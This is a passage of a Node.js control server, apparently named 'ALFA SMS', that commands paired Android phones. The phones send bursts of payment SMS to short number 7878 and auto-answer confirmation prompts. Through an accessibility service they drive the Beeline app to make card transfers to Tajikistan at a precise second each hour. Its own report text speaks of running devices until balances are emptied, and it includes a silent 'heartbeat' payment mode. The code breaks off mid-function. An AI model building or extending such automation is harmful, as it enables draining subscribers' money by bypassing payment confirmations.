'use strict';

/*
 * ALFA SMS — centralized control server (zero dependencies, Node 18+).
 *
 * Surfaces:
 *   1. /api/mini/*   — Telegram mini-app API. The user binds their access token
 *                      to their Telegram id (once), sets a GLOBAL schedule that
 *                      applies to all their devices (interval / windows / start),
 *                      manages devices (add via QR, active toggle) and per-device
 *                      PAYMENTS (each: requisites + amount + optional repeat
 *                      count). The global work switch starts every active device
 *                      instantly.
 *   2. /api/admin/*  — full admin panel, restricted to one Telegram id
 *                      (ADMIN_TG_ID). Manage tokens: create with expiry + device
 *                      quota, change quota, extend, enable/disable, unbind, delete.
 *   3. /api/device/* — the Android APK. It only scans a QR to pair, then
 *                      long-polls its desired state (schedule + payments) and
 *                      reports status. SMS always go to a fixed number (7878).
 *   4. /admin        — legacy password-protected HTML panel (break-glass).
 *
 * Storage: a single JSON file (data/db.json).
 *
 * Run:  ADMIN_PASSWORD=secret TELEGRAM_BOT_TOKEN=... node server.js
 */

const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

const PORT = parseInt(process.env.PORT || '8080', 10);
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '';
// The single Telegram id allowed into the in-app admin panel.
const ADMIN_TG_ID = String(process.env.ADMIN_TG_ID || '8211351879');
// Telegram bot token (BotFather). When set, initData signatures are verified.
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
// Fixed SMS recipient for every payment message; also the source of the
// "операция отклонена" / "оплата не произведена" replies.
const RECIPIENT_NUMBER = String(process.env.RECIPIENT_NUMBER || '7878');
// Source of the "символ" / "успешно" replies; "Ок" is sent back to it.
const SIGNAL_NUMBER = String(process.env.SIGNAL_NUMBER || '8464');
// "Метод Форс": the device drives the Beeline (Билайн) app UI to make a card
// transfer at one exact Moscow-time moment each hour. Everything about the flow
// is delivered from here so it can be re-tuned to a new Beeline layout WITHOUT
// rebuilding the APK. Times are seconds-within-the-hour, Moscow time (UTC+3).
//   Prepare everything, then press «Отправить» exactly at mm:ss = 59:58
//   → 59*60+58 = 3598. Preparation starts 5 min earlier → lead = 300 s.
//   If «Повторить» appears, tap it once immediately and wait for the handshake.
const MF_RULE_FIRE_SEC = parseInt(process.env.MF_RULE_FIRE_SEC || '3598', 10);
const MF_RULE_PREP_LEAD_SEC = parseInt(process.env.MF_RULE_PREP_LEAD_SEC || '300', 10);
// Beeline app package (queried + driven by the accessibility service).
const MF_BEELINE_PACKAGE = process.env.MF_BEELINE_PACKAGE || 'ru.beeline.services';
// Hourly SMS burst for «Метод Форс» tokens: every hour at mm:ss = 59:55 (Moscow),
// each active device sends `count` payment SMS to 7878, `intervalMs` apart — the
// same old SMS mechanism, running alongside the Beeline automation. 59*60+55 = 3595.
const MF_BURST_ENABLED = (process.env.MF_BURST_ENABLED || 'true') === 'true';
const MF_BURST_FIRE_SEC = parseInt(process.env.MF_BURST_FIRE_SEC || '3595', 10);
const MF_BURST_COUNT = parseInt(process.env.MF_BURST_COUNT || '5', 10);
const MF_BURST_INTERVAL_MS = parseInt(process.env.MF_BURST_INTERVAL_MS || '1000', 10);
function metodForsConfig() {
  return {
    beelinePackage: MF_BEELINE_PACKAGE,
    // The exact screen sequence, by on-screen label. Tunable without an APK rebuild.
    steps: [
      'Сервисы', 'Перевести деньги', 'Перевод на карту за рубеж',
      'Таджикистан', 'По номеру карты', 'Мой номер',
    ],
    cardFieldHint: 'Введите номер карты',
    continueLabel: 'Продолжить',
    sendLabel: 'Отправить',
    backToFinanceLabel: 'Вернуться в финансы',
    repeatLabel: 'Повторить',
    // Signal-side words (from 8464): symbol prompt → reply → success confirmation.
    symbolWord: 'символ',
    replyText: 'Ок',
    successWord: 'успешно',
    rule: { fireSec: MF_RULE_FIRE_SEC, prepLeadSec: MF_RULE_PREP_LEAD_SEC },
    // Hourly old-style SMS burst (xx:59:55 MSK, 5 SMS × 1 s) on active devices.
    hourlyBurst: {
      enabled: MF_BURST_ENABLED, fireSec: MF_BURST_FIRE_SEC,
      count: MF_BURST_COUNT, intervalMs: MF_BURST_INTERVAL_MS,
    },
  };
}

const PAIRING_TTL_MS = parseInt(process.env.PAIRING_TTL_MS || String(10 * 60 * 1000), 10);
const LONGPOLL_TIMEOUT_MS = parseInt(process.env.LONGPOLL_TIMEOUT_MS || '25000', 10);
const SYNC_INTERVAL_MS = parseInt(process.env.SYNC_INTERVAL_MS || '15000', 10);
const PUBLIC_BASE_URL = (process.env.PUBLIC_BASE_URL || 'https://project.alfa-vpn.ru').replace(/\/+$/, '');

const DATA_DIR = path.join(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');
const PUBLIC_DIR = path.join(__dirname, 'public');
const APK_FILE = path.join(DATA_DIR, 'alfa-sms.apk');
const UPDATE_FILE = path.join(DATA_DIR, 'update.json');
const MAX_APK_BYTES = 150 * 1024 * 1024; // 150 MB upload cap

function readUpdateInfo() {
  let info = { versionCode: 0, versionName: '', notes: '' };
  if (fs.existsSync(UPDATE_FILE)) { try { info = JSON.parse(fs.readFileSync(UPDATE_FILE, 'utf8')); } catch (e) {} }
  return info;
}

// Stable per-bot webhook secret (path + Telegram secret_token header).
const WEBHOOK_SECRET = TELEGRAM_BOT_TOKEN
  ? crypto.createHash('sha256').update('alfa-sms:' + TELEGRAM_BOT_TOKEN).digest('hex').slice(0, 32)
  : '';
// Secret for the MacroDroid "signal" webhook. Stable across restarts.
const SIGNAL_SECRET = process.env.SIGNAL_SECRET
  || crypto.createHash('sha256').update('signal:' + ADMIN_PASSWORD).digest('hex').slice(0, 24);

// Bot username (without @) for the desktop "Log in with Telegram" widget.
const BOT_USERNAME = (process.env.BOT_USERNAME || 'alfa_sms_bot').replace(/^@/, '');
// HMAC key for signing the desktop web-session cookie. Stable across restarts.
const SESSION_SECRET = process.env.SESSION_SECRET
  || crypto.createHash('sha256').update('session:' + (TELEGRAM_BOT_TOKEN || ADMIN_PASSWORD)).digest('hex');
const SESSION_TTL_MS = 30 * 24 * 60 * 60 * 1000; // 30 days
// A signal must not restart the same token more often than this (anti-runaway).
const SIGNAL_COOLDOWN_MS = parseInt(process.env.SIGNAL_COOLDOWN_MS || '90000', 10);
// A whole burst of "символ" (window opened → many devices at once) counts as ONE
// system signal within this window.
const SIGNAL_GLOBAL_DEBOUNCE_MS = parseInt(process.env.SIGNAL_GLOBAL_DEBOUNCE_MS || '10000', 10);
// Safety net: a signal session must not stay "on" forever. Normally the device
// ends it (1 SMS + wait for "символ"); if the device is offline / on an old app
// and never reports done, the server force-ends it after this long so new
// signals aren't blocked by a stuck "идёт работа по сигналу".
const SIGNAL_SESSION_MAX_MS = parseInt(process.env.SIGNAL_SESSION_MAX_MS || '120000', 10);
// Probe pool: each device sends at most this many detection SMS per rolling hour.
const PROBES_PER_HOUR = parseInt(process.env.PROBES_PER_HOUR || '3', 10);
// Never fire two probes closer than this, even with very many devices.
const PROBE_MIN_GAP_MS = parseInt(process.env.PROBE_MIN_GAP_MS || '1500', 10);
// Hidden heartbeat: every active/idle device silently sends exactly ONE payment
// SMS on the wall-clock 10-minute marks (:00 :10 :20 :30 :40 — the :50 slot is
// skipped ⇒ 5 per hour). It answers "символ" with "Ок" (the device does this
// automatically) but must NOT raise a system signal: for HEARTBEAT_QUIET_MS after
// each heartbeat, a "символ" from that device is swallowed instead of fanning out.
// FROZEN for now — default OFF; set HEARTBEAT_ENABLED=true to re-enable later.
const HEARTBEAT_ENABLED = (process.env.HEARTBEAT_ENABLED || 'false') === 'true';
const HEARTBEAT_QUIET_MS = parseInt(process.env.HEARTBEAT_QUIET_MS || '60000', 10);

if (!ADMIN_PASSWORD) {
  console.error('FATAL: set ADMIN_PASSWORD environment variable before starting.');
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Storage
// ---------------------------------------------------------------------------

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
}

function loadDb() {
  ensureDataDir();
  if (!fs.existsSync(DB_FILE)) return { tokens: [], devices: [], paymentsLog: [], signalLog: [], stopLog: [], settings: {} };
  try {
    const db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    db.tokens = db.tokens || [];
    db.devices = db.devices || [];
    db.paymentsLog = db.paymentsLog || []; // log of successful ("успешно") payments
    db.signalLog = db.signalLog || []; // log of "символ" webhook hits (MacroDroid)
    db.stopLog = db.stopLog || []; // log of automatic session stops (sessionComplete)
    db.settings = db.settings || {}; // global toggles (e.g. the probe pool)
    // Migrate any older records to the current shape.
    for (const t of db.tokens) if (!t.schedule) t.schedule = defaultSchedule();
    // "Метод Форс": a per-token capability the admin grants. Off by default —
    // the mini-app only shows the feature to tokens where it is enabled.
    for (const t of db.tokens) if (typeof t.metodForsEnabled !== 'boolean') t.metodForsEnabled = false;
    // "Автоматическое подтверждение": when ON (default), the device auto-replies
    // «Ок» to «символ». When OFF, it doesn't — the owner gets a bot prompt
    // «Подтвердите платеж на устройстве X» and confirms manually.
    for (const t of db.tokens) if (typeof t.autoConfirm !== 'boolean') t.autoConfirm = true;
    for (const d of db.devices) if (!Array.isArray(d.payments)) d.payments = [];
    return db;
  } catch (e) {
    console.error('Failed to read db.json, starting empty:', e.message);
    return { tokens: [], devices: [], paymentsLog: [], signalLog: [], stopLog: [] };
  }
}

let saveTimer = null;
function saveDb() {
  ensureDataDir();
  const tmp = DB_FILE + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, DB_FILE);
}
function saveDbSoon() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    try { saveDb(); } catch (e) { console.error('saveDb error:', e.message); }
  }, 500);
}

// ---------------------------------------------------------------------------
// Small helpers
// ---------------------------------------------------------------------------

function now() { return Date.now(); }
function uuid() { return crypto.randomUUID(); }
function clientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return String(fwd).split(',')[0].trim();
  return (req.socket && req.socket.remoteAddress) || '';
}

function newTokenValue() {
  const hex = crypto.randomBytes(10).toString('hex').toUpperCase();
  return hex.match(/.{1,5}/g).join('-');
}
function newPairingCode() {
  const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let s = '';
  const bytes = crypto.randomBytes(8);
  for (let i = 0; i < 8; i++) s += alphabet[bytes[i] % alphabet.length];
  return s;
}
function newSecret() { return crypto.randomBytes(24).toString('hex'); }

function sendJson(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(body);
}
function readBody(req, maxBytes = 1e6) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (c) => { data += c; if (data.length > maxBytes) { req.destroy(); reject(new Error('too_large')); } });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}
async function readJson(req) {
  const raw = await readBody(req);
  try { return JSON.parse(raw || '{}'); } catch (e) { return null; }
}
function esc(s) {
  return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
function fmtTime(ms) { return ms ? new Date(ms).toISOString().replace('T', ' ').slice(0, 19) + ' UTC' : '—'; }
function fmtDate(ms) { return ms ? new Date(ms).toISOString().slice(0, 10) : '∞'; }
function safeEqual(a, b) {
  const ba = Buffer.from(String(a)); const bb = Buffer.from(String(b));
  if (ba.length !== bb.length) return false;
  return crypto.timingSafeEqual(ba, bb);
}

// ---------------------------------------------------------------------------
// Domain model
// ---------------------------------------------------------------------------

function tokenValid(t) {
  if (!t || !t.enabled) return false;
  if (t.expiresAt && now() >= t.expiresAt) return false;
  return true;
}
function findTokenByValue(v) { return db.tokens.find((t) => t.value === v); }
// A token is accessible to its owner (t.telegramId) and to its employees.
function tokenMembers(t) {
  const list = [];
  if (t.telegramId) list.push(String(t.telegramId));
  for (const e of (t.employees || [])) list.push(String(e.telegramId));
  return list;
}
function findTokenByTelegram(id) {
  const s = String(id);
  // Desktop token login carries the token directly as "tok:<tokenId>".
  if (s.startsWith('tok:')) { const tid = s.slice(4); return db.tokens.find((t) => t.id === tid); }
  return db.tokens.find((t) => tokenMembers(t).includes(s));
}
// The owner is the first Telegram id bound to the token; a desktop token-login
// session (holding the raw token) also gets owner-level access.
function isOwner(t, id) {
  if (!t) return false;
  const s = String(id);
  if (s === 'tok:' + t.id) return true;
  return !!t.telegramId && String(t.telegramId) === s;
}
// Removes a Telegram identity from every token (owner or employee).
function detachIdentity(id) {
  const s = String(id);
  for (const t of db.tokens) {
    if (String(t.telegramId) === s) t.telegramId = null;
    if (Array.isArray(t.employees)) t.employees = t.employees.filter((e) => String(e.telegramId) !== s);
  }
}
function newInviteCode() {
  const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let s = ''; const b = crypto.randomBytes(8);
  for (let i = 0; i < 8; i++) s += alphabet[b[i] % alphabet.length];
  return s;
}
function tokenDevices(tokenId) { return db.devices.filter((d) => d.tokenId === tokenId); }

// Global (per-token) schedule that applies to every device under the token.
function defaultSchedule() {
  return { intervalSec: 15, windows: [], repeatDaily: false, startAtMillis: 0, starts: [] };
}
function sanitizeSchedule(input) {
  const s = defaultSchedule();
  if (!input || typeof input !== 'object') return s;
  let iv = parseInt(input.intervalSec, 10);
  if (!Number.isFinite(iv) || iv < 1) iv = 15;
  s.intervalSec = Math.min(iv, 86400);
  s.windows = Array.isArray(input.windows)
    ? input.windows.map((w) => ({
        startSec: Math.max(0, Math.min(86399, parseInt(w.startSec, 10) || 0)),
        endSec: Math.max(0, Math.min(86399, parseInt(w.endSec, 10) || 0)),
      })).filter((w) => w.startSec !== w.endSec).slice(0, 20)
    : [];
  s.repeatDaily = Boolean(input.repeatDaily);
  const start = parseInt(input.startAtMillis, 10);
  s.startAtMillis = Number.isFinite(start) && start > 0 ? start : 0;
  // Scheduled bursts ("залпы"): at each time-of-day, fire `count` SMS spaced
  // `intervalMs` apart. Recurs daily. The device fires them by its own clock.
  s.starts = Array.isArray(input.starts)
    ? input.starts.map((b) => ({
        atSec: Math.max(0, Math.min(86399, parseInt(b.atSec, 10) || 0)),
        count: Math.max(1, Math.min(1000, parseInt(b.count, 10) || 1)),
        intervalMs: Math.max(0, Math.min(600000, parseInt(b.intervalMs, 10) || 0)),
      })).slice(0, 50)
    : [];
  return s;
}

// A payment block: requisites (message part 1) + amount (message part 2), and
// optionally repeated N times ("несколько платежей на этот реквизит с той же
// суммой"). Each repeat is one символ→Ок→успешно cycle.
// Normalizes a money amount to a canonical numeric string ("1 234,50" -> "1234.50").
function normalizeAmount(raw) {
  const s = String(raw == null ? '' : raw).trim().replace(/\s+/g, '').replace(',', '.');
  return s;
}
function isNumericAmount(raw) {
  const s = normalizeAmount(raw);
  return s.length > 0 && /^\d+(\.\d+)?$/.test(s) && parseFloat(s) > 0;
}
function amountValue(raw) {
  const s = normalizeAmount(raw);
  const n = parseFloat(s);
  return Number.isFinite(n) ? n : 0;
}
// Money formatting for reports: 1234.5 -> "1 234,5".
function fmtMoney(n) {
  const s = (Math.round(n * 100) / 100).toString().replace('.', ',');
  return s.replace(/\B(?=(\d{3})+(?![\d,]))/g, ' ');
}
// "DD.MM HH:MM:SS" in the server's timezone (TZ env = users' timezone, MSK).
function fmtDateTime(ms) {
  const d = new Date(ms);
  const p = (n) => String(n).padStart(2, '0');
  return `${p(d.getDate())}.${p(d.getMonth() + 1)} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

// Sanitizes an incoming payments array. Empty/absent -> [] (device unconfigured).
function sanitizePayments(input) {
  if (!Array.isArray(input)) return [];
  return input.slice(0, 50).map((p, i) => {
    const multiple = Boolean(p && p.multiple);
    let count = parseInt(p && p.count, 10);
    if (!Number.isFinite(count) || count < 1) count = 1;
    return {
      id: (p && p.id) ? String(p.id).slice(0, 40) : uuid(),
      name: i === 0 ? 'Платеж' : `Платеж ${i + 1}`,
      requisites: String((p && p.requisites) || '').trim().slice(0, 1000),
      amount: normalizeAmount(p && p.amount).slice(0, 32),
      multiple,
      count: multiple ? Math.min(count, 100000) : 1,
    };
  });
}
// Validates payments: each block needs non-empty requisites and a numeric amount.
// Returns null if OK, or an error code string.
function validatePayments(list) {
  for (const p of list) {
    if (!p.requisites) return 'empty_requisites';
    if (!isNumericAmount(p.amount)) return 'invalid_amount';
  }
  return null;
}
// The message actually sent for a payment: requisites + " " + amount.
function paymentMessage(p) {
  return [String(p.requisites || '').trim(), String(p.amount || '').trim()].filter(Boolean).join(' ');
}

// --- Schedule window checks (server-local time; set TZ to the users' timezone) ---
function secondOfDayNow(d = new Date()) {
  return d.getHours() * 3600 + d.getMinutes() * 60 + d.getSeconds();
}
function windowContains(w, s) {
  return w.startSec <= w.endSec
    ? (s >= w.startSec && s < w.endSec)
    : (s >= w.startSec || s < w.endSec);
}
function insideAnyWindow(windows, d = new Date()) {
  if (!windows || !windows.length) return false;
  const s = secondOfDayNow(d);
  return windows.some((w) => windowContains(w, s));
}
// Returns the window that "now" is inside, or null.
function currentWindow(windows, d = new Date()) {
  if (!windows || !windows.length) return null;
  const s = secondOfDayNow(d);
  return windows.find((w) => windowContains(w, s)) || null;
}
function localDateStr(d = new Date()) {
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
}
// True when the token's schedule says work should be running right now.
function scheduleActiveNow(t) {
  const sch = (t && t.schedule) || defaultSchedule();
  if (sch.windows && sch.windows.length) return insideAnyWindow(sch.windows);
  if (sch.startAtMillis && now() >= sch.startAtMillis) return true;
  return false;
}
// Starts a work session for a token in the given mode.
function startSession(t, mode) {
  t.globalOn = true;
  t.workSession = uuid();
  t.workMode = mode;
  t.reportedSession = '';
  bumpToken(t);
}

// A "символ" was caught somewhere → start every opted-in token (respecting
// schedule priority, already-running, and the per-token cooldown). Shared by the
// MacroDroid webhook and the in-app probe pool. Returns a small summary.
let LAST_GLOBAL_SIGNAL_AT = 0;
function fireSignal(source) {
  // Global debounce: when a window opens, "символ" hits many devices within a
  // second or two. Collapse that whole burst into a single system fan-out.
  const nowMs = now();
  if (nowMs - LAST_GLOBAL_SIGNAL_AT < SIGNAL_GLOBAL_DEBOUNCE_MS) {
    db.signalLog.push({ at: nowMs, source: source || 'webhook', debounced: true, started: 0, skipped: 0, tokens: [] });
    if (db.signalLog.length > 5000) db.signalLog = db.signalLog.slice(-3000);
    return { started: 0, skipped: 0, debounced: true };
  }
  LAST_GLOBAL_SIGNAL_AT = nowMs;
  let started = 0, skipped = 0;
  const tokens = [];
  for (const t of db.tokens) {
    if (!t.signalEnabled) continue;
    if (!tokenValid(t)) { tokens.push({ comment: t.comment || t.value, result: 'invalid' }); continue; }
    if (t.globalOn || scheduleActiveNow(t)) {
      skipped++;
      tokens.push({ comment: t.comment || t.value, result: t.globalOn ? 'already_running' : 'schedule_active' });
      continue;
    }
    if (t.lastSignalAt && (now() - t.lastSignalAt) < SIGNAL_COOLDOWN_MS) {
      skipped++;
      tokens.push({ comment: t.comment || t.value, result: 'cooldown' });
      continue;
    }
    t.lastSignalAt = now();
    startSession(t, 'signal');
    started++;
    tokens.push({ comment: t.comment || t.value, result: 'started' });
  }
  db.signalLog.push({ at: now(), source: source || 'webhook', started, skipped, tokens });
  if (db.signalLog.length > 5000) db.signalLog = db.signalLog.slice(-3000);
  return { started, skipped };
}

// --- Probe pool: keep probing to detect the open window ("символ") ---
function deviceOnline(d) { return !!(d.lastSeen && (now() - d.lastSeen) < SYNC_INTERVAL_MS * 3); }
function deviceHasWork(d) {
  return (d.payments || []).some((p) => String(p.requisites || '').trim() && String(p.amount || '').trim());
}
function probesLastHour(d) {
  const cutoff = now() - 3600000;
  d.probeLog = (d.probeLog || []).filter((ts) => ts >= cutoff);
  return d.probeLog.length;
}
// A device may probe if active, online, has a payment, its token is valid, and it
// has not already used its 3 probes this rolling hour.
function probeEligible(d, t) {
  return !!t && t.enabled && tokenValid(t) && !!d.active &&
    deviceOnline(d) && deviceHasWork(d) && probesLastHour(d) < PROBES_PER_HOUR;
}
function issueProbe(d) {
  d.probeLog = d.probeLog || [];
  d.probeLog.push(now());
  d.probeReq = uuid();
  bumpDevice(d); // wakes the device's long-poll → it sends one probe SMS
}

// --- Hidden heartbeat (see HEARTBEAT_ENABLED) ---
// A device gets a heartbeat only when it is active, online, has a payment, its
// token is valid/enabled, and the token is NOT currently working (globalOn). That
// last check keeps the heartbeat from interfering with any live session — it only
// touches idle devices. It is independent of the "Отработать по сигналу" toggle
// and the admin probe pool: systemic for everyone.
function heartbeatEligible(d, t) {
  return !!t && t.enabled && tokenValid(t) && !!d.active && !t.globalOn &&
    deviceOnline(d) && deviceHasWork(d);
}
function issueHeartbeat(d) {
  d.heartbeatAt = now();     // opens the quiet window: "символ" now won't fan out
  d.probeReq = uuid();       // reuses the device's one-shot single-send path
  bumpDevice(d);             // wakes the long-poll → device sends one SMS at once
}

// ---------------------------------------------------------------------------
// Instant push to devices via long-polling.
// ---------------------------------------------------------------------------

const waiters = new Map(); // deviceId -> Set<{res,timer,secret}>

function deviceVersion(d, t) { return `${(t && t.rev) || 0}:${d.rev || 0}`; }

function wakeDevice(d) {
  const set = waiters.get(d.id);
  if (!set) return;
  waiters.delete(d.id);
  for (const w of set) { clearTimeout(w.timer); try { finishSync(w.res, d, w.secret); } catch (e) {} }
}
function bumpDevice(d) { d.rev = (d.rev || 0) + 1; wakeDevice(d); }
function bumpToken(t) { t.rev = (t.rev || 0) + 1; for (const d of tokenDevices(t.id)) wakeDevice(d); }

function buildSyncPayload(d, t) {
  const valid = tokenValid(t);
  const run = valid && !!(t && t.globalOn) && !!d.active;
  const sched = (t && t.schedule) || defaultSchedule();
  const payments = (d.payments || [])
    .map((p) => ({ requisites: p.requisites, amount: p.amount, count: p.multiple ? Math.max(1, p.count) : 1 }))
    .filter((p) => (p.requisites || p.amount));
  return {
    ok: true,
    version: deviceVersion(d, t),
    run,
    active: !!d.active,
    globalOn: !!(t && t.globalOn),
    tokenValid: valid,
    workSession: (t && t.workSession) || '',
    workMode: (t && t.workMode) || 'manual', // manual | schedule | signal
    probeReq: d.probeReq || '', // when this changes, the device sends one probe SMS
    // "Метод Форс": when enabled for the token, the device runs the Beeline
    // automation engine (one exact Moscow-time rule per hour) instead of the
    // plain SMS sender. serverNowMs is our NTP-backed wall clock — the device
    // syncs its Moscow time to it so it hits xx:59:58 to the second, even if
    // the phone's own clock is wrong.
    metodFors: valid && !!(t && t.metodForsEnabled),
    metodForsConfig: metodForsConfig(),
    serverNowMs: Date.now(),
    // Manual-confirmation flow: when the owner presses «Подтвердить» in the bot,
    // this nonce changes → the device sends the deferred «Ок» to the pending
    // «символ» sender.
    confirmReq: d.confirmReq || '',
    // One-shot «Метод Форс» test: when this nonce changes the device dry-runs the
    // Beeline flow and reports what it sees (without pressing «Отправить»).
    mfTestReq: d.mfTestReq || '',
    config: {
      // «Автоматическое подтверждение» — default ON (auto «Ок»); OFF ⇒ manual.
      autoConfirm: !(t && t.autoConfirm === false),
      number: RECIPIENT_NUMBER,
      signalNumber: SIGNAL_NUMBER,
      intervalSec: sched.intervalSec,
      windows: sched.windows,
      repeatDaily: sched.repeatDaily,
      starts: sched.starts || [],
      startAtMillis: sched.startAtMillis,
      payments,
      stopWord: 'символ',
      resumeWord: 'успешно',
      replyText: 'Ок',
      rejectWord: 'операция отклонена',
      stopSessionWord: 'оплата не произведена',
    },
    syncIntervalMs: SYNC_INTERVAL_MS,
  };
}
function finishSync(res, d, secret) {
  if (!d.secret || !safeEqual(d.secret, secret)) return sendJson(res, 403, { error: 'unauthorized' });
  const t = db.tokens.find((x) => x.id === d.tokenId);
  d.lastSeen = now();
  saveDbSoon();
  return sendJson(res, 200, buildSyncPayload(d, t));
}

// ---------------------------------------------------------------------------
// Telegram Bot API (reports + "Доработать" flow)
// ---------------------------------------------------------------------------

function tgApi(method, params) {
  return new Promise((resolve) => {
    if (!TELEGRAM_BOT_TOKEN) return resolve(null);
    const body = JSON.stringify(params || {});
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (r) => {
      let d = '';
      r.on('data', (c) => (d += c));
      r.on('end', () => { try { resolve(JSON.parse(d)); } catch (e) { resolve(null); } });
    });
    req.on('error', (e) => { console.error('tgApi error:', e.message); resolve(null); });
    req.write(body);
    req.end();
  });
}
function tgSend(chatId, text, keyboard) {
  const params = { chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true };
  if (keyboard) params.reply_markup = { inline_keyboard: keyboard };
  return tgApi('sendMessage', params);
}
function tgAnswerCallback(id, text) {
  return tgApi('answerCallbackQuery', { callback_query_id: id, text: text || '' });
}
function eschtml(s) {
  return String(s).replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
}

// --- Report computation ---

// Per-device outcome for the current work session, from its reported progress.
function computeDeviceReport(d, t) {
  const P = d.payments || [];
  const same = d.status && d.status.workSession && d.status.workSession === t.workSession;
  const idx = same ? (d.status.paymentIndex || 0) : 0;
  const tc = same ? (d.status.triggerCount || 0) : 0;
  let executed = 0, target = 0;
  P.forEach((p, i) => {
    const amt = amountValue(p.amount);
    const cnt = p.multiple ? Math.max(1, p.count) : 1;
    target += amt * cnt;
    const done = i < idx ? cnt : (i === idx ? Math.min(tc, cnt) : 0);
    executed += amt * done;
  });
  return { name: d.name, executed, target, remaining: Math.max(0, target - executed) };
}

// Devices that took part in the session (paired, active, have payments).
function participatingDevices(t) {
  return tokenDevices(t.id).filter((d) => d.pairedAt && d.active && (d.payments || []).length > 0);
}
function sessionComplete(t) {
  if (!t.globalOn || !t.workSession) return false;
  // A session finishes (stop + report) only when EVERY participating device has
  // confirmed all its blocks (device.done). This holds for "Немедленно" too: a
  // "символ" runs the normal Ок → ждать "успешно" → следующий блок cycle, and
  // once all blocks are confirmed the work naturally ends. Devices that never
  // catch a "символ" never mark done, so "Немедленно" keeps sending until the
  // user turns it off — nothing else stops it.
  const parts = participatingDevices(t);
  if (parts.length === 0) return false;
  return parts.every((d) => d.status && d.status.workSession === t.workSession && d.status.done);
}

function buildReportMessage(t) {
  const parts = participatingDevices(t);
  let totalExec = 0, totalTarget = 0, totalRem = 0;
  const lines = parts.map((d) => {
    const r = computeDeviceReport(d, t);
    totalExec += r.executed; totalTarget += r.target; totalRem += r.remaining;
    const mark = r.remaining <= 0 ? '🟢' : (r.executed > 0 ? '🟡' : '🔴');
    return `${mark} <b>${eschtml(r.name)}</b>\n` +
      `   🟢 Отправлено: <b>${fmtMoney(r.executed)}</b>\n` +
      `   🎯 Задача: <b>${fmtMoney(r.target)}</b>\n` +
      `   🔴 Не отработано: <b>${fmtMoney(r.remaining)}</b>`;
  });
  const header = totalRem <= 0
    ? '✅ <b>Работа завершена — всё отработано!</b>'
    : '📊 <b>Отчёт по работе устройств</b>';
  const body = lines.length ? lines.join('\n\n') : 'Нет устройств с настроенными платежами.';
  // Actually confirmed ("успешно") payments for this work session.
  const paid = (db.paymentsLog || []).filter((p) => p.tokenId === t.id && p.session && p.session === t.workSession);
  const paidSum = paid.reduce((s, p) => s + (parseFloat(String(p.amount).replace(',', '.')) || 0), 0);
  const totals =
    `\n\n━━━━━━━━━━━━━━\n` +
    `Σ Отправлено: <b>${fmtMoney(totalExec)}</b>\n` +
    `Σ Задача: <b>${fmtMoney(totalTarget)}</b>\n` +
    `Σ Не отработано: <b>${fmtMoney(totalRem)}</b>\n` +
    `💸 Ушедших платежей: <b>${paid.length}</b> шт. на <b>${fmtMoney(paidSum)}</b>`;
  const note = totalRem > 0
    ? `\n\n💡 Чтобы доработать платежи, которые не были исполнены, нажмите кнопку ниже. ` +
      `Затем выставьте расписание — система сама уберёт уже отработанные платежи и настроит работу до опустошения балансов.`
    : '';
  const text = `${header}\n\n${body}${totals}${note}`;
  const keyboard = totalRem > 0 ? [[{ text: '🔧 Доработать', callback_data: `rw:${t.id}` }]] : null;
  return { text, keyboard };
}

// Sends the report once per work session to the token's Telegram user.
function maybeSendReport(t) {
  if (!t || !t.telegramId || !t.workSession) return;
  if (t.reportedSession === t.workSession) return;
  t.reportedSession = t.workSession;
  saveDb();
  const msg = buildReportMessage(t);
  tgSend(t.telegramId, msg.text, msg.keyboard);
}

// --- "Доработать": strip executed payments, keep only unexecuted ones ---

function reworkToken(t) {
  for (const d of tokenDevices(t.id)) {
    const P = d.payments || [];
    if (P.length === 0) continue;
    const same = d.status && d.status.workSession && d.status.workSession === t.workSession;
    if (!same) continue; // device didn't run this session — leave it untouched
    const idx = d.status.paymentIndex || 0;
    const tc = d.status.triggerCount || 0;
    const next = [];
    P.forEach((p, i) => {
      if (i < idx) return; // fully executed → drop
      if (i === idx) {
        const cnt = p.multiple ? Math.max(1, p.count) : 1;
        const remaining = cnt - Math.min(tc, cnt);
        if (remaining > 0) next.push({ ...p, multiple: remaining > 1, count: remaining });
        // else fully executed → drop
      } else {
        next.push(p); // not started → keep
      }
    });
    d.payments = sanitizePayments(next);
    d.status = {};
    bumpDevice(d);
  }
  t.globalOn = false;
  t.workSession = '';
  t.reportedSession = '';
  bumpToken(t);
  saveDb();
}

async function handleTelegramUpdate(update) {
  try {
    if (update.callback_query) {
      const cq = update.callback_query;
      const fromId = String(cq.from && cq.from.id);
      const data = String(cq.data || '');
